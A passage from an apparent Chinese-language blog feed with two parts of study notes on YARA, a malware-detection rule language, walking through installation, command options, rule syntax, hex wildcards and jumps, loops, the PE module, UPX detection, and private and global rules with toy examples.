class="hljs-keyword">for</span> <span class="hljs-literal">any</span> of them : (<span class="hljs-comment"># &gt; 2)</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>上述规则，abc这三个字符串，任意组合只要出现超过两次就可以，至少是一组。</p><h3 id="使用匿名字符串"><a href="#使用匿名字符串" class="headerlink" title="使用匿名字符串"></a>使用匿名字符串</h3><p>当使用<code>of</code>，<code>for..of</code>，指定了them时，分配给规则中的每个字符串的标识符通常是多余的，因为并没有单独的引用某个具体的字符串，所以可以不需要为每个字符串都提供标识符。在这些情况下，可以只使用仅有$字符组成的标识符声明匿名字符串</p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts">rule <span class="hljs-class">test</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">strings:</span><br>$ = <span class="hljs-string">&quot;test1&quot;</span><br>$ = <span class="hljs-string">&quot;test2&quot;</span><br><span class="hljs-symbol">condition:</span><br>any of them<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="迭代字符串"><a href="#迭代字符串" class="headerlink" title="迭代字符串"></a>迭代字符串</h3><p>yara也可以写一个类似于C的FOR循环，语法是<code>for..of</code></p><p>如下示例，可以检索所有PE文件中的区段，区段名为text的会命中规则。</p><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">import <span class="hljs-string">&quot;pe&quot;</span><br>rule test<br>&#123;<br>condition:<br><span class="hljs-keyword">for</span> any <span class="hljs-selector-tag">section</span> <span class="hljs-keyword">in</span> pe<span class="hljs-selector-class">.sections</span> : (<span class="hljs-selector-tag">section</span><span class="hljs-selector-class">.name</span> == <span class="hljs-string">&quot;.text&quot;</span>)<br>&#125;<br></code></pre></div></td></tr></table></figure><p>比如现在可以来检测是否存在UPX壳，UPX加壳后，会有一个区段是UPX，图为UPX3.96版本加壳后的区段信息。</p><p><img src="/2021/09/14/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/10.png"></p><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">import <span class="hljs-string">&quot;pe&quot;</span><br>rule test<br>&#123;<br>condition:<br><span class="hljs-keyword">for</span> any <span class="hljs-selector-tag">section</span> <span class="hljs-keyword">in</span> pe<span class="hljs-selector-class">.sections</span> : (<span class="hljs-selector-tag">section</span><span class="hljs-selector-class">.name</span> == <span class="hljs-string">&quot;UPX0&quot;</span>) <br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/09/14/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/11.png"></p><p>b在文件中前三次出现的位置偏移必须比a多7。</p><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">rule test<br>&#123;<br>strings:<br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;test1&quot;</span><br><span class="hljs-variable">$b</span> = <span class="hljs-string">&quot;test2&quot;</span><br>condition:<br><span class="hljs-keyword">for</span> all <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> (<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>) : (@<span class="hljs-selector-tag">a</span><span class="hljs-selector-attr">[i]</span> + <span class="hljs-number">7</span> == @<span class="hljs-selector-tag">b</span><span class="hljs-selector-attr">[i]</span>)<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/09/14/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/12.png"></p><h3 id="引用其他规则"><a href="#引用其他规则" class="headerlink" title="引用其他规则"></a>引用其他规则</h3><p>在编写规则之前，还可以使用类似函数调用的方式，引用之前定义的规则。</p><figure class="highlight puppet"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs puppet">rule <span class="hljs-keyword">test1</span><br>&#123;<br>strings:<br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;test1&quot;</span><br>condition:<br><span class="hljs-variable">$a</span><br>&#125;<br><br><span class="hljs-keyword">rule</span> <span class="hljs-keyword">test2</span><br>&#123;<br>strings:<br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;test2&quot;</span><br>condition:<br><span class="hljs-variable">$a</span> <span class="hljs-keyword">and</span> test1<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="全局规则"><a href="#全局规则" class="headerlink" title="全局规则"></a>全局规则</h3><p>全局规则可以一次对所有的规则进行限制，比如想要限制文件的大小，可以定义一条全局规则来进行限制，而不用单独在每个规则中都进行大小限制。</p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts">global rule <span class="hljs-class">sizelimit</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">condition:</span><br>filesize <span class="hljs-params">&lt; <span class="hljs-number">100</span>KB</span><br><span class="hljs-params">&#125;</span><br></code></pre></div></td></tr></table></figure><h3 id="私有规则"><a href="#私有规则" class="headerlink" title="私有规则"></a>私有规则</h3><p>私有规则只是在匹配给定的文件时，yara不会报告的规则，当一个规则引用了另一个规则时，可以使用私有规则来让它不要报告。</p><figure class="highlight puppet"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs puppet">rule <span class="hljs-keyword">test1</span><br>&#123;<br>strings:<br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;test1&quot;</span><br>condition:<br><span class="hljs-variable">$a</span><br>&#125;<br><br><span class="hljs-keyword">rule</span> <span class="hljs-keyword">test2</span><br>&#123;<br>strings:<br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;test2&quot;</span><br>condition:<br><span class="hljs-variable">$a</span> <span class="hljs-keyword">and</span> test1<br>&#125;<br></code></pre></div></td></tr></table></figure><p>看到结果只报告了test2，没有报告test1，正常情况是要报告的。</p><p><img src="/2021/09/14/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/13.png"></p><h3 id="规则标签"><a href="#规则标签" class="headerlink" title="规则标签"></a>规则标签</h3><p>yara可以向规则添加标签。这些标签用于过滤yara的输出并且只显示感兴趣的规则。</p><figure class="highlight puppet"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs puppet">rule test1 : <span class="hljs-keyword">test</span><br>&#123;<br>strings:<br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;test1&quot;</span><br>condition:<br><span class="hljs-variable">$a</span><br>&#125;<br><br><span class="hljs-keyword">rule</span> <span class="hljs-keyword">test2</span> : <span class="hljs-keyword">b1ackie</span><br>&#123;<br>strings:<br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;test2&quot;</span><br>condition:<br><span class="hljs-variable">$a</span> <span class="hljs-keyword">and</span> test1<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="元数据"><a href="#元数据" class="headerlink" title="元数据"></a>元数据</h3><p>除去字符串定义和条件部分，规则还可以有一个元数据部分，可以在其中放置有关规则的其他信息。元数据部分使用关键字<code>meta</code>。</p><figure class="highlight puppet"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs puppet">rule test1 : <span class="hljs-keyword">test</span><br>&#123;<br>strings:<br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;test1&quot;</span><br>condition:<br><span class="hljs-variable">$a</span><br>&#125;<br><br><span class="hljs-keyword">rule</span> <span class="hljs-keyword">test2</span> : <span class="hljs-keyword">b1ackie</span><br>&#123;<br>strings:<br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;test2&quot;</span><br>condition:<br><span class="hljs-variable">$a</span> <span class="hljs-keyword">and</span> test1<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="模块的使用"><a href="#模块的使用" class="headerlink" title="模块的使用"></a>模块的使用</h3><p>模块是yara核心功能的扩展，一些模块，比如PE，Cuckoo是由yara官方发布的，其他模块可以由第三方创建。使用模块的第一步是使用<code>import</code>导入它。</p><blockquote><p>import “pe”</p></blockquote><p>搭配如模块后，可以使用其功能，用法是<code>modulename.func</code>比如</p><blockquote><p>pe.entry_point</p><p>pe.sections</p></blockquote><h3 id="外部变量"><a href="#外部变量" class="headerlink" title="外部变量"></a>外部变量</h3><p>外部变量允许定义依赖于外部提供的值得规则。</p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts">rule <span class="hljs-class">ExternalVariableExample1</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">    condition:</span><br>        ext_var == <span class="hljs-number">10</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>这种情况下ext_var是一个外部变量，通过-d参数来指定。</p><p>外部变量可以是这些类型：整数、字符串或布尔值。它们的类型取决于分配给它们的值。整数变量可以替代条件中的任何整数常量，布尔常量可以占据布尔表达式的位置。</p><figure class="highlight mipsasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mipsasm">rule <span class="hljs-keyword">ExternalVariableExample2</span><br><span class="hljs-keyword"></span>&#123;<br><span class="hljs-symbol">    condition:</span><br>        <span class="hljs-keyword">bool_ext_var </span><span class="hljs-keyword">or </span>filesize &lt; int_ext_var<br>&#125;<br></code></pre></div></td></tr></table></figure><p>字符串常量可以与这些运算符一起使用，</p><p><code>contains</code>：如果字符串包含指定的子字符串，返回true</p><p><code>matches</code>：如果字符串匹配给定的正则表达式时，返回true</p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts">rule <span class="hljs-class">ContainsExample</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">    condition:</span><br>        string_ext_var contains <span class="hljs-string">&quot;text&quot;</span><br>&#125;<br>rule <span class="hljs-class">MatchesExample</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">    condition:</span><br>        string_ext_var matches /[a-z]+/<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="包含文件"><a href="#包含文件" class="headerlink" title="包含文件"></a>包含文件</h3><p>yara提供了<code>include</code>指令，它可以将其他规则文件包含到当前文件中。</p><blockquote><p>include “other.yar”</p></blockquote><p>相对路径</p><blockquote><p>include “./test/other.yar”</p><p>include “../test/other.yar”</p></blockquote><p>绝对路径</p><blockquote><p>include “C:/test/other.yar”</p></blockquote><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://yara.readthedocs.io/en/v4.1.2/index.html">https://yara.readthedocs.io/en/v4.1.2/index.html</a></p><p><a href="https://www.cnblogs.com/SunsetR/p/12650325.html#autoid-3-2-0">https://www.cnblogs.com/SunsetR/p/12650325.html#autoid-3-2-0</a></p>]]></content>
    
    
    <categories>
      
      <category>YARA</category>
      
    </categories>
    
    
    <tags>
      
      <tag>YARA</tag>
      
      <tag>恶意代码检测</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>yara规则学习笔记（一）</title>
    <link href="/2021/09/13/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/2021/09/13/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>yara是一种皆在帮助恶意软件研究人员识别和分类恶意软件样本的工具。每一个描述，也就是规则，由一组字符串和一个确定其逻辑布尔表达式组成。</p><p>官方文档地址：</p><p><a href="https://yara.readthedocs.io/en/v4.1.2/index.html">https://yara.readthedocs.io/en/v4.1.2/index.html</a></p><p>windows端官方下载地址：</p><p><a href="https://github.com/VirusTotal/yara/releases/tag/v4.1.2">https://github.com/VirusTotal/yara/releases/tag/v4.1.2</a></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>安装非常的简单，在windows下，可以直接访问<a href="https://github.com/VirusTotal/yara/releases/tag/v4.1.2">https://github.com/VirusTotal/yara/releases/tag/v4.1.2</a>来进行下载</p><p><img src="/2021/09/13/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/1.png"></p><p>下载解压之后就可以直接使用了，输入参数–help可以看到所有yara的参数。</p><p><img src="/2021/09/13/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/2.png"></p><p>中文翻译</p><figure class="highlight haml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs haml">-<span class="ruby">t --tag=tag只打印标记为tag的规则</span><br><span class="ruby"></span>-<span class="ruby">i --identifier=identifier只打印名为identifier的规则</span><br><span class="ruby"></span>-<span class="ruby">n --negate只打印不满足的规则（negate）</span><br><span class="ruby"></span>-<span class="ruby">D --打印模块数据打印模块数据</span><br><span class="ruby"></span>-<span class="ruby">g --打印标签打印标签</span><br><span class="ruby"></span>-<span class="ruby">m --打印元数据</span><br><span class="ruby"></span>-<span class="ruby">s --打印字符串打印匹配的字符串</span><br><span class="ruby"></span>-<span class="ruby">L --打印字符串长度打印匹配字符串的长度</span><br><span class="ruby"></span>-<span class="ruby">e --打印命名空间打印规则的命名空间</span><br><span class="ruby"></span>-<span class="ruby">p --threads=NUMBER使用指定的线程数扫描目录</span><br><span class="ruby"></span>-<span class="ruby">l --max rules=NUMBER匹配多个规则后中止扫描</span><br><span class="ruby"></span>-<span class="ruby">d VAR=值定义外部变量</span><br><span class="ruby"></span>-<span class="ruby">x MODULE=文件将文件内容作为额外数据传递到模块</span><br><span class="ruby"></span>-<span class="ruby">a --timeout=秒在给定秒数后中止扫描</span><br><span class="ruby"></span>-<span class="ruby">k --堆栈大小=插槽设置的最大堆栈大小（默认值=<span class="hljs-number">16384</span>）</span><br><span class="ruby"></span>-<span class="ruby">r --递归递归搜索目录</span><br><span class="ruby"></span>-<span class="ruby">f ——快速扫描快速匹配模式</span><br><span class="ruby"></span>-<span class="ruby">w --无警告禁用警告</span><br><span class="ruby"></span> -<span class="ruby">-警告失败警告失败</span><br><span class="ruby"></span>-<span class="ruby">v --版本显示版本信息</span><br><span class="ruby"></span>-<span class="ruby">h --help显示此帮助并退出</span><br></code></pre></div></td></tr></table></figure><h2 id="编写yara规则"><a href="#编写yara规则" class="headerlink" title="编写yara规则"></a>编写yara规则</h2><p>yara规则的语法类似于C语言，易于编写和理解，下面是官方给出的示例</p><figure class="highlight smalltalk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs smalltalk">rule silent_banker : banker<br>&#123;<br>    meta:<br>        description = <span class="hljs-comment">&quot;This is just an example&quot;</span><br>        thread_level = <span class="hljs-number">3</span><br>        in_the_wild = <span class="hljs-keyword">true</span><br>    strings:<br>        <span class="hljs-string">$a</span> = &#123;<span class="hljs-number">6</span>A <span class="hljs-number">40</span> <span class="hljs-number">68</span> <span class="hljs-number">00</span> <span class="hljs-number">30</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">6</span>A <span class="hljs-number">14</span> <span class="hljs-number">8</span>D <span class="hljs-number">91</span>&#125;<br>        <span class="hljs-string">$b</span> = &#123;<span class="hljs-number">8</span>D <span class="hljs-number">4</span>D <span class="hljs-type">B0</span> <span class="hljs-number">2</span>B <span class="hljs-type">C1</span> <span class="hljs-number">83</span> <span class="hljs-type">C0</span> <span class="hljs-number">27</span> <span class="hljs-number">99</span> <span class="hljs-number">6</span>A <span class="hljs-number">4</span>E <span class="hljs-number">59</span> <span class="hljs-type">F7</span> <span class="hljs-type">F9</span>&#125;<br>        <span class="hljs-string">$c</span> = <span class="hljs-comment">&quot;UVODFRYSIHLNWPEJXQZAKCBGMT&quot;</span><br>    condition:<br>        <span class="hljs-string">$a</span> or <span class="hljs-string">$b</span> or <span class="hljs-string">$c</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>meta是一些描述信息，</p><p>strings定义了一些十六进制值和一个字符串</p><p>condition定义了匹配的条件，a,b,c三个条件任意一个都会被认定为是silent_banker : banker</p><p>下面来进行一下简单的测试。</p><p>创建一个文件写入字符串，再创建一个文件写入$a的十六进制值。</p><p><img src="/2021/09/13/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/3.png"></p><p>将它们放在test file文件夹下，进行检测，可以看到规则成功命中</p><p><img src="/2021/09/13/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/4.png"></p><p>yara的每条规则都以关键字rule开头，后面跟规则标识符。标识符必须遵循与C编程语言相同的词汇约定，它们可以包含任何字母数字字符和下划线字符串，但是第一个字符不能是数字，规则标识符是区分大小写的，不可以超过128个字符。以下关键字是保留的，不能用作标识符：</p><table><thead><tr><th>all</th><th>and</th><th>any</th><th>ascii</th><th>at</th><th>base64</th><th>base64wide</th><th>condition</th></tr></thead><tbody><tr><td>contains</td><td>endswith</td><td>entrypoint</td><td>false</td><td>filesize</td><td>for</td><td>fullword</td><td>global</td></tr><tr><td>import</td><td>icontains</td><td>iendswith</td><td>in</td><td>include</td><td>int16</td><td>int16be</td><td>int32</td></tr><tr><td>int32be</td><td>int8</td><td>int8be</td><td>istartwith</td><td>matches</td><td>meta</td><td>nocase</td><td>not</td></tr><tr><td>of</td><td>or</td><td>private</td><td>rule</td><td>startswith</td><td>strings</td><td>them</td><td>true</td></tr><tr><td>uint16</td><td>uint16be</td><td>uint32</td><td>uint32be</td><td>uint8</td><td>uint8be</td><td>wide</td><td>xor</td></tr></tbody></table><p>规则部分通常是由两部分组成：字符串定义和条件。如果规则不依赖于任何字符串，则可以省略字符串定义部分，但始终需要条件部分。字符串定义部分是定义成为规则一部分的字符串的地方。每个字符串都有一个标识符，由$字符后跟一系列字母数字字符和下划线组成，这些标识符可以用于条件部分以引用相应的字符串。字符串可以以文本或者十六进制形式定义，如下所示：</p><figure class="highlight puppet"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs puppet">rule <span class="hljs-keyword">test</span><br>&#123;<br>strings:<br><span class="hljs-variable">$test_string</span>=<span class="hljs-string">&quot;this is a test&quot;</span><br><span class="hljs-variable">$test_hex_value</span>=&#123;<span class="hljs-number">11</span> <span class="hljs-number">22</span> <span class="hljs-number">33</span> <span class="hljs-number">44</span>&#125;<br><span class="hljs-keyword">condition</span>:<br><span class="hljs-variable">$test_string</span> or <span class="hljs-variable">$test_hex_value</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>文本字符串用双引号括起来，像在C语言中一样，十六进制数字用大括号括起来。</p><p>条件部分是规则逻辑所在。该部分必须包含一个布尔表达式，说明在何种情况下文件或者进程满足规则。通常。条件将通过使用它们的标识符来引用先前定义的字符串。在这种情况下，字符串标识符充当布尔变量，如果在文件或者进程内存中找到字符串，则该变量评估为真，否则为假。</p><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>可以向规则中添加注释，像C一样，支持单行和多行注释。</p><figure class="highlight mel"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mel">rule test<br>&#123;<br><span class="hljs-comment">//这是单行注释</span><br>strings:<br>$test_string=<span class="hljs-string">&quot;this is a test&quot;</span><br>$test_hex_value=&#123;<span class="hljs-number">11</span> <span class="hljs-number">22</span> <span class="hljs-number">33</span> <span class="hljs-number">44</span>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">这是一个</span><br><span class="hljs-comment">多行注释</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">condition</span>:<br>$test_string or $test_hex_value<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><p>yara中有三种类型的字符串：十六进制字符串、文本字符串和正则表达式。十六进制字符串用于定义原始字节序列，而文本字符串和正则表达式用于定义清晰文本的部分。然而，文本字符串和正则表达式也可用于转义序列来表示原始字节。</p><h4 id="十六进制字符串"><a href="#十六进制字符串" class="headerlink" title="十六进制字符串"></a>十六进制字符串</h4><p>十六进制字符串允许三种特殊结构，使其更加灵活：通配符、跳转和替代。通配符只是一个占位符，表明某些字节是未知的，它们可以匹配任何内容。占位符是（?）。示例如下：</p><figure class="highlight puppet"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs puppet">rule <span class="hljs-keyword">WildcardTest</span><br>&#123;<br>strings:<br><span class="hljs-variable">$a</span> = &#123;<span class="hljs-number">31</span> <span class="hljs-number">32</span> <span class="hljs-number">33</span> <span class="hljs-number">34</span> ?? <span class="hljs-number">36</span> <span class="hljs-number">3</span>? <span class="hljs-number">38</span> <span class="hljs-number">39</span>&#125;<br><span class="hljs-keyword">condition</span>:<br><span class="hljs-variable">$a</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>现在向test文件内写入“123456789”这段字符串，可以成功检测。</p><p><img src="/2021/09/13/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/5.png"></p><p>通配符在你知道字符串的可变块长度时很有用，然而，有时情况不是这样。某些情况下，可能需要定义具有可变内容和长度的块的字符串。在这些情况下可以使用跳转。</p><figure class="highlight puppet"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs puppet">rule <span class="hljs-keyword">JumpTest</span><br>&#123;<br>strings:<br><span class="hljs-variable">$a</span> = &#123;<span class="hljs-number">31</span> [<span class="hljs-number">0</span>-<span class="hljs-number">7</span>] <span class="hljs-number">39</span>&#125;<br><span class="hljs-keyword">condition</span>:<br><span class="hljs-variable">$a</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>还是继续测试刚才的文件，可以看到成功检测到，提示了一个warning意思是可能会拖慢扫描速度，主要是规则编写的不到位，不够精准。</p><p><img src="/2021/09/13/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/6.png"></p><p>在上面的例子中，用方括号括起来0-7，这就是一个跳转，意思是任何0-7个字节的任意序列都可以占据此位置，比如这些字符都是可以匹配到当前规则的。</p><blockquote><p>123456789</p><p>1xx9</p><p>19</p><p>1asdasd9</p></blockquote><p>任何跳转的条件[X-Y]都必须满足Y&gt;X的条件，如下是无效的</p><blockquote><p>31 32 [10-2] 39</p></blockquote><p>如果上下限相等，也就是说要匹配的数字的长度是固定的，可以写一个括在括号里的数字，如下所示</p><blockquote><p>31 32 33 [2] 36</p></blockquote><p>其等价于：</p><blockquote><p>31 32 33 [2-2] 36</p><p>31 32 33 ?? ?? 36</p></blockquote><p>从yara2.0开始还有无界跳转</p><blockquote><p>31 32 [10-] 39</p><p>31 32 [-] 39</p></blockquote><p>第一个的意思是10-无限，第二个意思是无限。</p><p>在某些情况下，可以使用正则表达式的语法</p><figure class="highlight puppet"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs puppet">rule <span class="hljs-keyword">Test</span><br>&#123;<br>strings:<br><span class="hljs-variable">$a</span> = &#123;<span class="hljs-number">31</span> <span class="hljs-number">32</span> (<span class="hljs-number">33</span> <span class="hljs-number">34</span> | <span class="hljs-number">36</span> <span class="hljs-number">37</span>) <span class="hljs-number">39</span>&#125;<br><span class="hljs-keyword">condition</span>:<br><span class="hljs-variable">$a</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>此规则将会匹配<code>12349</code>和<code>12679</code></p><p>也可以将通配符结合起来，如下：</p><figure class="highlight puppet"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 